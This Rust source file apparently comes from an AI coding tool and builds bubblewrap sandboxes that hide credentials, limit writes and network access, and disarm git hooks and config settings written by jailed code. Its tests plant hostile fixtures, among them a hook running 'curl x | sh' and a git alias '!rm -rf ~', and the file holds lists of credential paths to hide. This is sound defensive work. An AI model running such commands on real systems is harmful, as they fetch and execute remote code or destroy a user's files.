//! bubblewrap jails, as the Python app builds them: the system read-only,
//! the working folder writable (or read-only, for commands that may only
//! look), a private /tmp, /run and /var/tmp (no D-Bus, docker or ssh-agent
//! sockets to escape through), credentials hidden, its own PID namespace,
//! and no network unless allowed. A repo's hooks and config are mounted
//! read-only, and whatever a jailed command did to git's program-running
//! settings anywhere under the folder is disarmed afterwards.

use std::path::{Path, PathBuf};
use std::sync::{Arc, OnceLock};

/// Per-folder access, as the window's /access sets it (settings.json
/// `folder_access`: folder → mode; missing means full).
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Access {
    /// Commands run as you, anywhere you can.
    Full,
    /// The folder freely, nothing outside it without asking: commands run
    /// jailed with the folder writable, the rest of your home hidden (but
    /// your toolchains and build caches), the system read-only; a command
    /// that names a path outside the folder asks you first. The default.
    Guarded,
    /// Only this folder is writable; network allowed.
    SandboxNet,
    /// Only this folder is writable; no network.
    Sandbox,
    /// Nothing is run or changed in the folder; only looking.
    ReadOnly,
}

impl Access {
    pub fn parse(s: &str) -> Access {
        match s {
            "sandbox-net" => Access::SandboxNet,
            "sandbox" => Access::Sandbox,
            "readonly" => Access::ReadOnly,
            "full" => Access::Full,
            // anything else, or nothing set: the folder freely, ask outside it
            _ => Access::Guarded,
        }
    }

    pub fn label(self) -> &'static str {
        match self {
            Access::Full => "full access",
            Access::Guarded => "this folder, ask outside",
            Access::SandboxNet => "sandboxed",
            Access::Sandbox => "sandboxed, offline",
            Access::ReadOnly => "read-only",
        }
    }
}

/// What a jailed command must never see: credentials, and Chuck's own
/// config (the API key). Hidden behind empty mounts.
pub const HIDE_DIRS: &[&str] = &[".ssh", ".gnupg", ".aws", ".kube", ".docker", ".password-store", ".config/gh",
    ".config/chucknorris", ".local/share/keyrings", ".config/gcloud", ".azure", ".config/rclone", ".config/glab-cli",
    // browser profiles: cookies and saved passwords are logins
    ".mozilla", ".config/BraveSoftware", ".config/chromium", ".config/google-chrome", ".thunderbird"];
/// Single files that hold tokens: shown as empty.
/// Some sit inside folders a build needs (cargo's registry token in ~/.cargo,
/// git's credential store, Maven's and Gradle's publishing passwords).
pub const HIDE_FILES: &[&str] = &[".netrc", ".git-credentials", ".pypirc", ".npmrc", ".pgpass", ".my.cnf",
    ".config/hub", ".config/git/credentials", ".cargo/credentials", ".cargo/credentials.toml", ".vault-token",
    ".m2/settings.xml", ".m2/settings-security.xml", ".gradle/gradle.properties", ".config/pip/pip.conf",
    ".pip/pip.conf", ".gem/credentials"];

/// Toolchains under your home a jailed build needs to read (compilers,
/// SDKs, version managers).
pub const TOOLCHAIN_DIRS: &[&str] = &[".cargo", ".rustup", ".local/bin", ".local/lib", ".local/share/pnpm", ".nvm",
    ".pyenv", ".rbenv", ".sdkman", ".deno", ".bun", ".volta", ".nimble", ".ghcup", ".elan", ".juliaup", "go/bin",
    "go/pkg", ".jdks", ".java", "Android/Sdk", "android-sdk", ".dotnet", "flutter", ".pub-cache", ".zig",
    // who you are to git, and your tools' own settings (never credentials: those stay hidden)
    ".gitconfig", ".config/git", ".gitignore_global", ".editorconfig"];
/// Build caches a jailed build writes (downloads, compiled dependencies,
/// emulators' disks): reused, never your documents.
pub const CACHE_DIRS: &[&str] = &[".cache", ".gradle", ".m2", ".ivy2", ".sbt", ".npm", ".yarn", ".android", ".konan",
    ".cargo/registry", ".cargo/git", ".local/share/pnpm/store", ".nuget", ".cache/go-build", "go/pkg/mod", ".expo",
    ".config/configstore"];

pub fn home() -> PathBuf {
    std::env::var_os("HOME").map(PathBuf::from).unwrap_or_else(|| PathBuf::from("/"))
}

fn real(p: &Path) -> PathBuf {
    p.canonicalize().unwrap_or_else(|_| p.to_path_buf())
}

/// Is `p` a credential the jail hides (~/.ssh, the API key, …)? Chuck's own
/// read and grep run outside any jail, so in a restricted folder they refuse
/// these too, or the model could read what its commands can't.
pub fn secret_path(p: &Path) -> bool {
    let rp = real(p);
    let h = home();
    HIDE_DIRS.iter().chain(HIDE_FILES).any(|rel| {
        let s = real(&h.join(rel));
        rp == s || rp.starts_with(&s)
    })
}

/// The bubblewrap binary, when installed.
pub fn bwrap() -> Option<PathBuf> {
    static B: OnceLock<Option<PathBuf>> = OnceLock::new();
    B.get_or_init(|| {
        std::env::var_os("PATH").and_then(|path| std::env::split_paths(&path).map(|d| d.join("bwrap"))
            .find(|p| p.is_file()))
    }).clone()
}

/// Where package managers keep their caches inside a jail (writable, shared
/// between runs, so a build doesn't download the world every time).
pub fn default_cache() -> PathBuf {
    home().join(".local").join("share").join("chucknorris").join("sandbox-cache")
}

#[derive(Clone, Debug)]
pub struct Jail {
    /// The folder the command works in.
    pub root: PathBuf,
    /// May it change the folder?
    pub write: bool,
    pub net: bool,
    /// Other folders it may write (Chuck's own output folders).
    pub writable: Vec<PathBuf>,
    pub cache: Option<PathBuf>,
    /// Paths under the private /run shown read-only (a daemon reads the journal).
    pub extra_ro: Vec<PathBuf>,
    /// A process meant to outlive one step (a language server) must not die
    /// with the thread that started it.
    pub persistent: bool,
    /// Hide your home folder but for the working folder, your toolchains and
    /// build caches (the "ask outside the folder" mode).
    pub hide_home: bool,
    /// What a command starts in the background (a server, an emulator) may
    /// outlive it for the next command to use. Without this the jail has
    /// its own process namespace and everything in it ends with the command.
    /// Either way, quitting Chuck ends it.
    pub keep_background: bool,
}

impl Jail {
    pub fn new(root: &Path) -> Jail {
        Jail { root: root.to_path_buf(), write: true, net: true, writable: Vec::new(), cache: Some(default_cache()),
               extra_ro: Vec::new(), persistent: false, hide_home: false, keep_background: false }
    }

    /// Background processes may outlive the command (the lead's commands).
    pub fn keep_background(mut self) -> Jail {
        self.keep_background = true;
        self
    }

    /// Only the folder (and what was allowed): the rest of home hidden.
    pub fn guarded(mut self) -> Jail {
        self.hide_home = true;
        self
    }

    /// Also writable: paths the user allowed outside the folder.
    pub fn allow(mut self, paths: &[PathBuf]) -> Jail {
        self.writable.extend(paths.iter().cloned());
        self
    }

    pub fn read_only(mut self) -> Jail {
        self.write = false;
        self
    }

    pub fn offline(mut self) -> Jail {
        self.net = false;
        self
    }

    /// The bubblewrap argv around `inner`.
    pub fn argv(&self, bwrap: &Path, inner: &[String]) -> Vec<String> {
        let s = |p: &Path| p.display().to_string();
        let mut a: Vec<String> = [s(bwrap).as_str(), "--ro-bind", "/", "/", "--dev", "/dev", "--proc", "/proc",
            "--tmpfs", "/tmp", "--tmpfs", "/var/tmp", "--tmpfs", "/run", "--new-session"]
            .iter().map(|x| x.to_string()).collect();
        if !self.keep_background {
            a.push("--unshare-pid".into());
        }
        if !self.persistent {
            a.push("--die-with-parent".into());
        }
        // emulators and VMs need KVM, GPU-using builds the render nodes: devices, not files
        for d in ["/dev/kvm", "/dev/dri"] {
            if Path::new(d).exists() {
                a.extend(["--dev-bind".into(), d.into(), d.into()]);
            }
        }
        // DNS: resolv.conf usually points into /run
        if let Ok(rc) = Path::new("/etc/resolv.conf").canonicalize() {
            if rc.starts_with("/run/") && rc.exists() {
                a.extend(["--ro-bind".into(), s(&rc), s(&rc)]);
            }
        }
        for var in ["DBUS_SESSION_BUS_ADDRESS", "SSH_AUTH_SOCK", "GPG_AGENT_INFO", "DISPLAY", "WAYLAND_DISPLAY",
                    "XAUTHORITY"] {
            a.extend(["--unsetenv".into(), var.into()]);
        }
        let cache = self.cache.as_ref().filter(|c| std::fs::create_dir_all(c).is_ok());
        let h = home();
        if self.hide_home && h.is_dir() && h != Path::new("/") {
            // home goes first, so the folder and what's allowed are mounted back over it
            a.extend(["--tmpfs".into(), s(&h)]);
            for rel in TOOLCHAIN_DIRS {
                let p = h.join(rel);
                if p.exists() {
                    a.extend(["--ro-bind".into(), s(&p), s(&p)]);
                }
            }
            for rel in CACHE_DIRS {
                let p = h.join(rel);
                if p.exists() {
                    a.extend(["--bind".into(), s(&p), s(&p)]);
                }
            }
        }
        let mut binds: Vec<(PathBuf, bool)> = vec![(self.root.clone(), self.write)];
        binds.extend(self.writable.iter().map(|w| (w.clone(), true)));
        if let Some(c) = cache {
            binds.push((c.clone(), true));
        }
        for (b, rw) in &binds {
            if b.exists() {
                a.extend([if *rw { "--bind" } else { "--ro-bind" }.into(), s(b), s(b)]);
            }
        }
        // credentials are hidden AFTER the binds: bwrap mounts in order, so a
        // working folder of ~ bound earlier can't bring ~/.ssh back
        let mut hidden = Vec::new();
        for rel in HIDE_DIRS {
            let p = h.join(rel);
            if p.is_dir() {
                a.extend(["--tmpfs".into(), s(&p)]);
                hidden.push(p);
            }
        }
        for rel in HIDE_FILES {
            let p = h.join(rel);
            if p.is_file() {
                a.extend(["--ro-bind".into(), "/dev/null".into(), s(&p)]);
            }
        }
        // a repo's hooks and config run OUTSIDE the jail the next time you use
        // git there: code inside may change the project, never what git runs
        for (b, rw) in &binds {
            if !rw {
                continue;
            }
            for sub in [".git/hooks", ".git/config"] {
                let gp = b.join(sub);
                if gp.exists() && !gp.is_symlink() {
                    a.extend(["--ro-bind".into(), s(&gp), s(&gp)]);
                }
            }
        }
        // Chuck's own folders that live under a hidden one come back
        for (b, rw) in binds.iter().skip(1) {
            if b.exists() && hidden.iter().any(|hd| b.starts_with(hd)) {
                a.extend([if *rw { "--bind" } else { "--ro-bind" }.into(), s(b), s(b)]);
            }
        }
        if let Some(c) = cache {
            for (var, sub) in [("XDG_CACHE_HOME", ""), ("npm_config_cache", "npm"), ("PIP_CACHE_DIR", "pip"),
                               ("CARGO_HOME", "cargo"), ("GOCACHE", "go-build"), ("GOMODCACHE", "go-mod"),
                               ("YARN_CACHE_FOLDER", "yarn"), ("BUN_INSTALL_CACHE_DIR", "bun")] {
                let p = if sub.is_empty() { c.clone() } else { c.join(sub) };
                a.extend(["--setenv".into(), var.into(), s(&p)]);
            }
        }
        for x in &self.extra_ro {
            if x.exists() {
                a.extend(["--ro-bind".into(), s(x), s(x)]);
            }
        }
        if !self.net {
            a.push("--unshare-net".into());
        }
        a.push("--".into());
        a.extend(inner.iter().cloned());
        a
    }

    /// A runner wrap for chuck-tools: every command in this jail, or none at
    /// all when bubblewrap is missing (a jailed folder never runs unjailed).
    pub fn wrap(self) -> chuck_tools::Wrap {
        Arc::new(move |argv: Vec<String>| bwrap().map(|b| self.argv(&b, &argv)))
    }
}

/// git settings that make git run a program: switched off in a config a
/// jailed command wrote (they'd run unconfined in your next git command).
fn git_runs() -> &'static regex::Regex {
    static R: OnceLock<regex::Regex> = OnceLock::new();
    // allow: protocol.ext.allow lets an ext:: remote run a command; smtpserver may name a program;
    // vcs picks a remote helper program
    R.get_or_init(|| regex::Regex::new(concat!(r"(?im)^(\s*)((?:fsmonitor|hookspath|sshcommand|pager|editor|askpass|",
        r"textconv|clean|smudge|process|helper|program|gitproxy|external|driver|cmd|path|uploadpack|receivepack|",
        r"uploadarchive|allow|smtpserver|vcs)\s*=",
        r"|[\w.-]+\s*=\s*!)")).unwrap())
}

const GIT_SCAN_SKIP: &[&str] = &["node_modules", ".venv", "venv", "__pycache__", "target", "dist", "build", ".cache",
    ".mypy_cache", ".pytest_cache", ".tox", ".next", ".gradle"];

/// Every repo's .git under root (a project may hold nested repos), without
/// wandering into dependency folders.
fn git_dirs(root: &Path, limit: usize) -> Vec<PathBuf> {
    let mut out = Vec::new();
    let mut it = walkdir::WalkDir::new(root).follow_links(false).into_iter();
    let mut seen = 0;
    while let Some(e) = it.next() {
        let Ok(e) = e else { continue };
        if !e.file_type().is_dir() {
            continue;
        }
        seen += 1;
        if seen > limit {
            break;
        }
        let n = e.file_name().to_string_lossy();
        if n == ".git" {
            out.push(e.path().to_path_buf());
            it.skip_current_dir();
        } else if e.depth() > 0 && GIT_SCAN_SKIP.contains(&n.as_ref()) {
            it.skip_current_dir();
        }
    }
    // a `.git` FILE ("gitdir: <path>") makes another folder the repo: one under root counts too
    let mut it = walkdir::WalkDir::new(root).follow_links(false).into_iter();
    let mut seen = 0;
    while let Some(Ok(e)) = it.next() {
        seen += 1;
        if seen > limit * 4 {
            break;
        }
        if e.file_type().is_dir() && e.depth() > 0 && GIT_SCAN_SKIP.contains(&e.file_name().to_string_lossy().as_ref()) {
            it.skip_current_dir();
            continue;
        }
        if e.file_type().is_file() && e.file_name() == ".git" {
            let Ok(text) = std::fs::read_to_string(e.path()) else { continue };
            let Some(to) = text.lines().find_map(|l| l.trim().strip_prefix("gitdir:")).map(str::trim) else { continue };
            let dir = e.path().parent().unwrap_or(root).join(to);
            if let Ok(real) = dir.canonicalize() {
                if real.starts_with(root.canonicalize().unwrap_or_else(|_| root.to_path_buf())) && !out.contains(&real) {
                    out.push(real);
                }
            }
        }
    }
    out
}

/// ctime, not mtime: a process can backdate mtime (touch -d), not ctime.
fn changed_since(p: &Path, since: i64) -> bool {
    use std::os::unix::fs::MetadataExt;
    std::fs::symlink_metadata(p).map(|m| m.ctime() >= since - 1).unwrap_or(false)
}

/// After jailed code ran in `root` (since `since`, unix seconds): a git hook
/// or a program-running git setting it created or changed, in any repo under
/// root, is disarmed. Hooks it didn't touch (yours) are left alone. Returns
/// what was disarmed.
pub fn git_disarm(root: &Path, since: i64) -> Vec<String> {
    let mut out = Vec::new();
    if !root.is_dir() {
        return out;
    }
    for g in git_dirs(root, 20_000) {
        let rel = g.strip_prefix(root).unwrap_or(&g).display().to_string();
        let hooks = g.join("hooks");
        if hooks.is_symlink() && changed_since(&hooks, since) {
            // hooks that live somewhere else now: that somewhere is in reach of the jail
            if std::fs::remove_file(&hooks).is_ok() {
                out.push(format!("{rel}/hooks"));
            }
        } else if hooks.is_dir() && !hooks.is_symlink() {
            for e in std::fs::read_dir(&hooks).into_iter().flatten().flatten() {
                let n = e.file_name().to_string_lossy().into_owned();
                let f = e.path();
                if n.ends_with(".sample") || n.ends_with(".disabled-by-chuck") || !changed_since(&f, since) {
                    continue;
                }
                if std::fs::rename(&f, f.with_file_name(format!("{n}.disabled-by-chuck"))).is_ok() {
                    out.push(format!("{rel}/hooks/{n}"));
                }
            }
        }
        let cfg = g.join("config");
        if cfg.is_symlink() && changed_since(&cfg, since) {
            if std::fs::remove_file(&cfg).is_ok() {
                out.push(format!("{rel}/config")); // a config that points elsewhere: gone
            }
        } else if cfg.is_file() && changed_since(&cfg, since) {
            if let Ok(text) = std::fs::read_to_string(&cfg) {
                let safe = git_runs().replace_all(&text, "${1}# disabled by Chuck: ${2}");
                if safe != text && std::fs::write(&cfg, safe.as_bytes()).is_ok() {
                    out.push(format!("{rel}/config"));
                }
            }
        }
    }
    out
}

pub fn now_secs() -> i64 {
    std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).map(|d| d.as_secs() as i64).unwrap_or(0)
}

#[cfg(test)]
mod tests {
    use super::*;
    use chuck_tools::{bash, RunOpts};

    fn tmp(tag: &str) -> PathBuf {
        let d = std::env::temp_dir().join(format!("chuck-jail-{tag}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&d);
        std::fs::create_dir_all(&d).unwrap();
        d
    }

    fn run(j: Jail, cmd: &str) -> chuck_tools::RunResult {
        let root = j.root.clone();
        let mut o = RunOpts::new(&root);
        o.wrap = Some(j.wrap());
        bash(cmd, o)
    }

    #[test]
    fn the_argv_has_the_walls_in_order() {
        let j = Jail::new(Path::new("/tmp")).offline();
        let a = j.argv(Path::new("/usr/bin/bwrap"), &["bash".into(), "-c".into(), "true".into()]);
        let at = |x: &str| a.iter().position(|y| y == x).unwrap();
        assert!(a.contains(&"--unshare-net".into()) && a.contains(&"--unshare-pid".into()));
        assert!(at("--bind") < a.len() && a[at("--bind") + 1] == "/tmp");
        assert_eq!(&a[a.len() - 4..], &["--", "bash", "-c", "true"]);
        assert!(!Jail::new(Path::new("/tmp")).argv(Path::new("b"), &[]).contains(&"--unshare-net".into()));
    }

    #[test]
    fn a_jail_writes_only_its_folder_and_only_when_allowed() {
        if bwrap().is_none() {
            eprintln!("bubblewrap not installed: skipped");
            return;
        }
        let d = tmp("rw");
        let mut j = Jail::new(&d);
        j.cache = None;
        let r = run(j.clone(), "echo hi > here.txt && cat here.txt; touch /usr/chuck-x 2>/dev/null && echo ESCAPED || echo walled");
        assert!(r.output.contains("hi") && r.output.contains("walled"), "{}", r.output);
        assert!(d.join("here.txt").exists());
        let r = run(j.clone().read_only(), "echo no > there.txt 2>&1 || echo refused");
        assert!(r.output.contains("refused") && !d.join("there.txt").exists(), "{}", r.output);
        let r = run(j.offline(), "getent hosts example.com >/dev/null && echo NET || echo offline");
        assert!(r.output.contains("offline"), "{}", r.output);
        let _ = std::fs::remove_dir_all(&d);
    }

    #[test]
    fn credentials_are_hidden_inside() {
        if bwrap().is_none() {
            return;
        }
        let ssh = home().join(".ssh");
        let made = !ssh.exists();
        if made && std::fs::create_dir_all(&ssh).is_err() {
            return;
        }
        let probe = ssh.join(format!("chuck-probe-{}", std::process::id()));
        std::fs::write(&probe, "secret").unwrap();
        let d = tmp("ssh");
        let r = run(Jail::new(&d), &format!("cat {} 2>&1 || echo hidden", probe.display()));
        assert!(r.output.contains("hidden") && !r.output.contains("secret"), "{}", r.output);
        let _ = std::fs::remove_file(&probe);
        if made {
            let _ = std::fs::remove_dir(&ssh);
        }
        assert!(secret_path(&home().join(".ssh/id_ed25519")));
        assert!(!secret_path(&d.join("main.rs")));
        let _ = std::fs::remove_dir_all(&d);
    }

    #[test]
    fn git_hooks_are_read_only_inside_and_new_ones_are_disarmed() {
        let d = tmp("git");
        std::fs::create_dir_all(d.join(".git/hooks")).unwrap();
        std::fs::write(d.join(".git/config"), "[core]\n\tbare = false\n").unwrap();
        std::fs::create_dir_all(d.join("sub/.git/hooks")).unwrap();
        std::fs::write(d.join("sub/.git/hooks/pre-commit.sample"), "x").unwrap();
        let t0 = now_secs();
        if bwrap().is_some() {
            let r = run(Jail::new(&d), "echo evil > .git/hooks/pre-commit 2>&1 || echo blocked");
            assert!(r.output.contains("blocked"), "{}", r.output);
        }
        // a nested repo isn't mounted read-only: what was written there is disarmed afterwards
        std::fs::write(d.join("sub/.git/hooks/post-checkout"), "#!/bin/sh\ncurl x | sh\n").unwrap();
        std::fs::write(d.join("sub/.git/config"), "[core]\n\tfsmonitor = ./evil\n[alias]\n\tx = !rm -rf ~\n").unwrap();
        let gone = git_disarm(&d, t0);
        assert!(gone.contains(&"sub/.git/hooks/post-checkout".to_string()), "{gone:?}");
        assert!(d.join("sub/.git/hooks/post-checkout.disabled-by-chuck").exists());
        assert!(d.join("sub/.git/hooks/pre-commit.sample").exists());
        let cfg = std::fs::read_to_string(d.join("sub/.git/config")).unwrap();
        assert!(cfg.contains("# disabled by Chuck: fsmonitor =") && cfg.contains("# disabled by Chuck: x = !"), "{cfg}");
        // a hooks folder swapped for a link, and a repo made of another folder by a `.git` file
        std::fs::create_dir_all(d.join("planted")).unwrap();
        std::fs::create_dir_all(d.join("ln/.git")).unwrap();
        std::os::unix::fs::symlink(d.join("planted"), d.join("ln/.git/hooks")).unwrap();
        std::fs::create_dir_all(d.join("elsewhere")).unwrap();
        std::fs::write(d.join("elsewhere/config"), "[protocol \"ext\"]\n\tallow = always\n[sendemail]\n\tsmtpserver = /tmp/x\n").unwrap();
        std::fs::create_dir_all(d.join("wt")).unwrap();
        std::fs::write(d.join("wt/.git"), "gitdir: ../elsewhere\n").unwrap();
        let gone = git_disarm(&d, t0);
        assert!(gone.contains(&"ln/.git/hooks".to_string()) && !d.join("ln/.git/hooks").exists(), "{gone:?}");
        let cfg = std::fs::read_to_string(d.join("elsewhere/config")).unwrap();
        assert!(cfg.contains("# disabled by Chuck: allow =") && cfg.contains("# disabled by Chuck: smtpserver ="), "{cfg}");
        let _ = std::fs::remove_dir_all(&d);
    }
}
